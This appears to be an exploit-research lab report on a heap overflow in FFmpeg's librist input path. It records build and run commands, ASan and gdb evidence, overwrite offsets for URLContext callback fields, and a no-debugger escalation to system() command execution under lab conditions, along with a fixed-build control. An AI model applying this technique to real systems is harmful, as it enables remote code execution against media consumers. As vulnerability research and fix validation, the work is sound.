# ffmpeg2shell — live-path result (W2, 2026-11-23)

**Result.** The CVE-2026-75143 sink was reproduced in a real FFmpeg n9.0
process, driven by a real librist sender over a loopback RIST wire through
`async:rist://`, with no stubbed librist/libavformat on the receive path.
ASan reports an out-of-bounds `WRITE` from `librist_read()` at pinned
`librist.c:230`; two vulnerable runs fault, a one-line-clamp fixed build and
a safe-input run stay clean. Under gdb the same live process shows
attacker-chosen bytes at offsets 4096, 4113, 4120, 5000 and 9000 past the
4096-byte caller window. With a local brk-layout tweak, the same overflow
overwrites live FFmpeg control pointers (`AVFifo.buffer`, `URLContext.prot`);
see the W3 section. This is rung 3 plus scoped rung 4 on **living bytes**,
not remote command execution.

## Builds and pins (all provisioning was read-only source fetch)

- librist: VideoLAN forge `https://code.videolan.org/rist/librist.git`,
  shallow clone HEAD `a911bee8904d88beb1ccd3349ff9a3de1cadc1a6`
  (2026-10-26), project version 0.2.20. Built with meson
  `-Dtest=false -Dbuiltin_cjson=true -Dbuiltin_lz4=true` (builtin mbedtls was
  selected automatically), installed to `live/prefix`. The formerly cited
  GitHub homes (`Meijin-Technologies/librist`, `librist/librist`,
  `FFmpeg/librist`) return 404 in 2026.
- FFmpeg: `https://codeload.github.com/FFmpeg/FFmpeg/tar.gz/refs/tags/n9.0`,
  tarball SHA-256
  `d97647ace36a307f17ba2bca052d68937487bed8682e1eb9b6737076a9c442b7`,
  reported commit `222c489`. Configured with `--toolchain=clang-asan
  --enable-librist --disable-everything
  --enable-protocol=async,librist,file,pipe --enable-demuxer=data
  --enable-muxer=null --enable-filter=anull --disable-doc
  --disable-autodetect`. Note the protocol config symbol is `librist`, not
  `rist`. Build rc 0 at 2026-11-23T08:01:24Z.
- Fixed binary: the same source tree with `librist.c:229` changed from
  `size = data_block->payload_len;` to
  `size = FFMIN(data_block->payload_len, size);`, i.e. upstream fix commit
  `1c10bcc2` as pinned in `lab/frontier/ffmpeg2shell/PROVENANCE.md`.
- Sender: `lab/frontier/ffmpeg2shell/live/rist_sender_live.c`, SHA-256
  `a87e97b47b3aee36d09709483b1619733fe5365c554fbe2be777d49b70a02371`.
  It calls `rist_sender_create`, `rist_peer_config_defaults_set`,
  `rist_parse_address2`, `rist_peer_create`, `rist_start` and
  `rist_sender_data_write` directly against the built library. All traffic
  is to 127.0.0.1; nothing external was contacted as a test.

## Geometry correction found on the live path

`librist_sender_data_write()` rejects `payload_len > RIST_MAX_PACKET_SIZE -
32 = 9968`, four bytes below FFmpeg's receive gate `MAX_PAYLOAD_SIZE =
10000-28 = 9972`. A stock librist sender therefore delivers 9968 bytes, not
9972; this is still 5872 bytes past the async caller's 4096-byte window.
The 9972 number in the direct-call harness is the protocol receive ceiling,
not a payload a stock sender can emit.

More importantly, the async destination is **not** a standalone 4096-byte
heap object. `async.c:88` allocates one 8388608-byte FIFO
(`av_fifo_alloc2(BUFFER_CAPACITY + READ_BACK_CAPACITY, 1, 0)`);
`async.c:235` asks for 4096 bytes and `fifo.c:167` hands
`librist_read()` a pointer `wptr` into that 8 MiB allocation. The first
~2048 reads write 9968 bytes entirely inside the ring and ASan stays
silent. The fault occurs when `wptr` reaches the allocation's last 4096
bytes: `len = FFMIN(nb_elems - offset_w, to_write)` becomes small, but
`librist_read()` ignores it and writes the full block across the end. The
frontier's "5876-byte overflow past a 4096-byte heap object" is a harness
model of the intended window; on a live consumer the measured claim is an
out-of-bounds ring write at the wrap boundary after roughly 8 MiB of
attacker-streamed data. On the default mmap layout no adjacent heap object
with metadata was identified; the brk-layout experiment below found one.

## Experiment matrix

Receiver (all cases):
`env LD_LIBRARY_PATH=live/prefix/lib ASAN_OPTIONS=detect_leaks=0:abort_on_error=0
<ffprobe-binary> -loglevel verbose -f data -i 'async:rist://@:5004' -show_packets`.

Sender (all cases):
`env LD_LIBRARY_PATH=live/prefix/lib ./rist_sender_live rist://127.0.0.1:5004 2200 <len>`.

| Case | Binary | Blocks x bytes | Result |
|---|---|---|---|
| vuln-1 | `ffprobe-vuln` | 2200 x 9968 | ASan heap-buffer-overflow, `WRITE of size 9968`, `ffprobe rc=1` |
| vuln-2 | `ffprobe-vuln` | 2200 x 9968 | same fault reproduced, `ffprobe rc=1` |
| fixed | `ffprobe-fixed` (FFMIN clamp) | 2200 x 9968 | ASan-clean, 8800 packets shown, survived to timeout `rc=124` |
| safe input | `ffprobe-vuln` | 2200 x 512 | ASan-clean, survived to timeout `rc=124` |

Sender logs show `sent 2200 blocks ... 0 failures` in all four cases.

## ASan evidence (vuln-1)

`live/evidence/live-vuln-asan-1.log`, thread T2 (async):

```
ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 9968 at 0x7c34ae9ff800 thread T2 (async)
0x7c34ae9ff800 is located 0 bytes after 8388608-byte region
```

Symbolized with `addr2line -e ffprobe_g-vuln` (unstripped build):

| Frame | Symbol | Source |
|---|---|---|
| write | `librist_read` | `libavformat/librist.c:230` |
| 1 | `ffurl_read2` | `libavformat/avio.c:522` |
| 2 | `ffurl_read` | `libavformat/url.h:183` |
| 3 | `fifo_write_common` | `libavutil/fifo.c:167` |
| 4 | `async_buffer_task` | `libavformat/async.c:152` |
| allocation | `av_fifo_alloc2` | `libavutil/fifo.c:57`, from `async_open` `async.c:88` |

The write frame is the async thread; the allocation happened in the main
thread. This is the same chain the frontier pinned from source, now observed
on running bytes.

## Chosen-byte readback (live, under gdb)

`live/evidence/live-vuln-gdb-chosen-bytes.log`. The breakpoint was placed at
`librist_read+0x1ba`, the instruction immediately after `__asan_memcpy`
returns, to avoid the EAGAIN paths that jump past the copy. At the hit:

```
librist_read (...) at libavformat/librist.c:230, size=9968
frame 1: retry_transfer_wrapper (..., buf=0x7ffff47ff800 'Z' <repeats 200 times>..., size=4096)
0x7ffff47ff800: 0x5a ...            (destination start)
0x7ffff4800800 = buf+4096: 0x41 0x5a ...
0x7ffff4800811 = buf+4113: 0x7a ... 0x3c at buf+4120
0x7ffff4800b88 = buf+5000: 0x42 ...
0x7ffff4801b28 = buf+9000: 0x63 ...
```

These are the marker bytes placed by `rist_sender_live.c`; the caller asked
for 4096 bytes, and the live ring holds the attacker's bytes well past that
window. This is placement in a real consumer's memory, not in the harness's
20000-byte sink. It is still byte placement, not a pointer or a command.

## Brk-layout pointer overwrite (W3, 2026-11-23)

W2's structural ceiling applies to the default mmap layout only. With glibc
`MALLOC_MMAP_THRESHOLD_=16777216` set locally on the same plain n9.0 build,
`av_fifo_alloc2`'s 8 MiB buffer comes from `[heap]` instead of its own mmap,
and the wrap write reaches live FFmpeg control objects. No source, binary or
wire format was changed for this experiment; the environment variable is a
local layout prerequisite, **not** attacker-controlled.

Allocation geometry under gdb (`evidence/layout-brk-alloc2-gdb.log`,
`layout-brk-alloc-gdb.log`):
`buffer=0x5555558d1fe0`, `AVFifo=0x5555560d2040` (`buffer+0x800060`),
wrapped librist `URLContext=0x5555560d2080` (`buffer+0x8000a0`). The struct
is allocated after the buffer by `av_fifo_alloc2` (`fifo.c:57,61`), so the
9968-byte overflow reaches both objects.

- Hardware watchpoint on `ring->fifo->buffer` (`evidence/layout-brk-watch-vuln2.log`):
  thread 3 async, old `0x5555558d1fe0`, new `0x5555558d1f5a` (low byte
  replaced by the sender's 0x5a fill), inside `librist_read` `librist.c:230`
  `memcpy`, reached via `fifo_write_common` `fifo.c:167` →
  `wrapped_url_read` `async.c:140`.
- Hardware watchpoint on `URLContext->prot` (`evidence/layout-brk-watch-prot2.log`):
  old `0x55555584fea0` `<ff_librist_protocol>`, new `0x55555584fe5a`; the
  same partial overwrite of the low byte. `ffurl_read` dereferences this
  field on every read (`libavformat/url.h:183`).
- Consumer dereference (`evidence/layout-brk-fields-gdb.log`): after the
  overwrite, main thread faults at `fifo_peek_common` `fifo.c:226` reading
  `(%rsi)` with `rsi=0x5a5a5a5a5a5a5a5a`; the `AVFifo` at that point has
  `buffer`, `elem_size`, `nb_elems`, `offset_r`, `flags` all set to 0x5a.
  This is chosen bytes in a live pointer that the consumer dereferences.

Controls: a plain FFMIN-fixed binary was built from the same source tree
(`librist.c:229` → `size = FFMIN(data_block->payload_len, size)`; vulnerable
source SHA-256 `bf749fb2…21e9a7c` restored after the build; fixed binary
SHA-256 `8d302dee…80e5857`). Against 2200 x 9968 blocks under the same
layout, it survives to timeout (`rc=124`,
`evidence/layout-brk-fixed-g.summary.txt`)
and neither watchpoint fires (`evidence/layout-brk-watch-fixed.summary.txt`,
`evidence/layout-brk-fixed-g.summary.txt`; `layout-brk-watch-prot2.log` is the
vulnerable run). The default mmap layout still faults at the read-only libc
mapping as described in the next section.

**Ceiling of W3 itself.** At the time of that experiment only the low byte of
each pointer was observed changed, to the sender's uniform 0x5a fill; no
chosen target, control transfer, marker or command was demonstrated there.
The layout tweak is local. W152 later ESTABLISHED rung 3 plus scoped rung 4
pointer control of live consumer state at that brk-layout scope. W4 below
goes further on the same layout and is a separate, author-only claim.

## Plain-build structural ceiling (host-specific negative)

A second FFmpeg n9.0 build without ASan (`live/plain/src`, same configure
minus `--toolchain=clang-asan`) was driven with the identical 2200 x 9968
loopback stream. It exits SIGSEGV (`rc=139`,
`live/evidence/live-plain-sigsegv.log`) at the wrap. Under gdb
(`live-plain-gdb-dest.log`, `live-plain-gdb-mappings.log`) the fault is in
`__memcpy_avx_unaligned_erms`, called from `memcpy` at
`libavformat/librist.c:230` with `buf=0x7ffff79fda80` and length 9968. The
write crosses the end of an anonymous `rw-p` region at `0x7ffff7a00000`, where
`/usr/lib/x86_64-linux-gnu/libc.so.6` is mapped `r--p`; the first bytes past
the ring hit a read-only mapping and fault before any writable neighbour can
be reached. On this host and build the wrap path offers no adjacent writable
object to groom, so pointer control or a benign marker through it is
structurally blocked. Other glibc versions, allocator states or map orders
were not measured; this is a negative for the tested build only.

## Ceiling / not claimed

- On the default mmap layout: no pointer control, ROP, function-pointer
  overwrite or chosen-address write; the ring's neighbours were unmapped or
  read-only. The brk-layout section above records scoped pointer overwrite
  only, now witness-ESTABLISHED at that scope; W4 below adds control transfer
  and a command under additional no-ASLR / known-address conditions.
- Witness W151 verdict #2428 (2026-11-23 09:04Z) independently replayed the
  W2 live path from `git archive HEAD cbeeafa` with its own builds and port
  5514: both vulnerable cases gave the pinned ASan `WRITE of size 9968`,
  fixed and safe inputs stayed clean, and its gdb saw the same chosen bytes.
  Rungs 3 and 4 are ESTABLISHED at the labeled live-loopback / ASan / ~8 MiB
  ring-wrap scope; its plain build also reproduced the read-only ceiling.
  Witness W152 verdict #2444 (2026-11-23 09:24Z) independently replayed the
  W3 brk-layout claim from `git archive HEAD abf314d` with its own builds and
  port 5614: the same buffer/AVFifo/URLContext geometry, both low-byte
  pointer rewrites (`…1fe0`→`…1f5a`, `…fea0`→`…fe5a`) inside the
  `librist.c:230` memcpy, the same main-thread `fifo_peek_common` fault on
  `rsi=0x5a5a…`, and clean fixed/safe/default-mmap controls. Rungs 3 and 4
  are ESTABLISHED at that labeled brk-layout scope; the witness explicitly
  withheld any control transfer or rung-5 grade.
- Main profile without encryption was used because FFmpeg does not expose
  its `rist_profile` AVOption through the URL query (librist's own parser
  reports `Unknown or invalid parameter rist_profile`); the receive path and
  the vulnerable function are the same.
- Reproducing the ASan fault needs ~8 MiB of streamed data to walk the ring
  write pointer to its end; a single oversized packet alone does not fault
  ASan on the live consumer.

## Failed attempts and negatives (preserved)

- The installed librist `ristsender` CLI fails at startup with
  `undefined symbol: rist_tun_read` under this library; the installed tool
  and the freshly built one have different hashes. Replaced by the direct
  API sender above.
- A 9972-byte sender block is rejected by librist with `write ... -1` on
  every attempt (900/900 failures); corrected to 9968 after reading
  `rist.c:633`.
- The first sender build had an uninitialized `struct rist_peer_config`,
  giving `Invalid encryption key length: 32765`; corrected by zeroing it.
- gdb breakpoints at pinned source lines 233/234 caught EAGAIN paths that
  jump past the memcpy (`mov $0xfffffff5,%r15d; jmp ...` in the
  disassembly), so the first three readback attempts showed untouched 0xBE
  fill. Breaking after the `memcpy` call gave the readback above.

## Re-run

The built artifacts and scripts live in
`lab/frontier/ffmpeg2shell/live/`. `live/run-cases.sh` runs the four cases
against already-built binaries; rebuilding from source needs the fetches and
configure/make commands quoted above. Check: vuln ASan `WRITE of size 9968`
at `librist.c:230`, fixed and safe clean.

## W4 — wire-driven control transfer and benign command (2026-11-23)

W3 left one question open: is the overwritten pointer merely evidence of
corruption, or does the consumer actually use a wire-chosen value? It uses
it. This section records a live, no-debugger command execution through the
overflow, with its prerequisites stated explicitly.

### What the consumer does with the overflow bytes

With the plain n9.0 build and `MALLOC_MMAP_THRESHOLD_=16777216` (the W3 brk
layout), the ring-wrap `memcpy` at `librist.c:230` reaches both the `AVFifo`
at `buffer+0x800060` and the wrapped librist `URLContext` at
`buffer+0x8000a0`. Measured from committed W3 evidence
(`layout-brk-watch-prot2.log`): overflow `dest=0x5555560d0a50`,
`URLContext=0x5555560d2080`, `prot` field at `dest+0x1638`.

- `evidence/reach-plain.log`: with the uniform 0x5a sender, at the *natural*
  next `ffurl_read2` (`avio.c:555`) the whole 8-byte `URLContext->prot` reads
  `0x5a5a5a5a5a5a5a5a`. W3 observed only a low-byte change at the first store;
  the complete pointer is attacker-controlled by the next dispatch.
- `evidence/pc-file.log`: a sender whose repeated 8-byte fill equals
  `&ff_file_protocol` sets `prot` to exactly `0x55555584f5a0` from wire bytes
  (`New value = ... <ff_file_protocol>`), no debugger write involved.
- The first natural indirect call is not through `prot->url_read`: it is
  `h->interrupt_callback.callback(h->interrupt_callback.opaque)`, invoked by
  `ff_check_interrupt` at `avio.c:520` in `retry_transfer_wrapper`. Both
  fields are in the same overwritten `URLContext` (`+0x30` and `+0x38`).
  `evidence/sc-file.log` shows it reached: with a sane `AVFifo` carried in
  the same payload, RIP entered the wire-chosen address from `avio.c:520`.

### Benign marker and command

`evidence/mc-puts.log`: callback `0x7ffff7a87cc0` (`puts`), opaque
`0x5555560d20d0`, string carried at `URLContext+0x50`. gdb hit
`__GI__IO_puts (str=0x5555560d20d0 "FFMPEG2SHELL_WIRE_MARKER\n")` and the
marker appeared in the receiver output. The FFMIN-fixed build produced 0
watch hits and 0 markers (`mc-fixed.log`).

`evidence/w4-nogdb-matrix.summary.txt` is the authoritative result: no
debugger attached, ASLR disabled with `setarch -R` so the lab-measured
absolute addresses hold, callback `0x7ffff7a58750` (`system`), opaque pointing
at the URLContext-resident command string, sender `rist_sender_cmd` (SHA-256
`deca9946…b8ee`). Four sequential cases, each 2200 blocks, 0 sender failures:

| Case | Build / wire | Receiver | Marker side effect |
|---|---|---|---|
| ng-v4 | vulnerable, 2200 x 9968, cb=system | `double free or corruption`, rc 134 | `/tmp/ffmpeg2shell-w4-g4` CREATED, mtime 09:30:58Z |
| ng-f4 | FFMIN-fixed, same wire | rc 124 (timeout) | absent |
| ng-s4 | vulnerable, 2200 x 512 | rc 124 | absent |
| ng-n4 | vulnerable, 9968, cb=0 | rc 134 | absent |

The vulnerable process aborts from heap corruption *after* the command ran;
the side effect is the file, not the exit code. `system()` under gdb is flaky
because gdb holds the forked shell, so the no-debugger matrix is the evidence
used here. Full packet captures stay in the local lab tree; replay with
`live/no-gdb-case.sh`.

### Conditions and grade

Required and measured: local `MALLOC_MMAP_THRESHOLD_=16777216`; ASLR disabled
with `setarch -R`; PIE and libc absolute addresses measured in this build
(`ff_file_protocol 0x55555584f5a0`, `ff_async_protocol 0x2fb420`,
`ff_pipe_protocol 0x2fb4e0`, `ff_librist_protocol 0x2fbea0`, `puts
0x7ffff7a87cc0`, `system 0x7ffff7a58750`); main-profile unencrypted RIST on
loopback; ~8 MiB streamed to walk the ring write pointer to the wrap. The
command is lab-chosen and benign; the callback address is a lab-measured
absolute value, not a leaked or brute-forced one.

Grade: witness W153 (#2461, 2026-11-23 09:51Z) replayed the four no-gdb
checks with witness-owned builds and ESTABLISHED the W4 no-debugger command
claim at the labeled scope: port 5714, its own marker paths and
`/usr/bin/touch` variants, calibrated addresses (`&system 0x7ffff7a58750`,
`&ff_file_protocol 0x55555584f5a0`, `h 0x5555560d2080`), and a fresh v4
no-gdb matrix with fixed, safe and cb=0 controls absent (rc 124/134). The
limits stay inside the claim: `setarch -R` no-ASLR, the local
`MALLOC_MMAP_THRESHOLD_=16777216` brk layout, lab-measured absolute addresses
passed as sender arguments, unencrypted main profile, benign `touch` only,
no ROP and a later abort of the vulnerable process. Rung 5 is ESTABLISHED at
that scope only; the default-mmap read-only ceiling from W2 and any ASLR-on
or stock-layout execution remain unclaimed. Two earlier script defects were
found and corrected: the structured sender wrote past a 512-byte `malloc` in
one safe case, and an early `no-gdb-case.sh` edit dropped the command
argument and overrode the callback. Those void runs are not evidence and are
not cited.

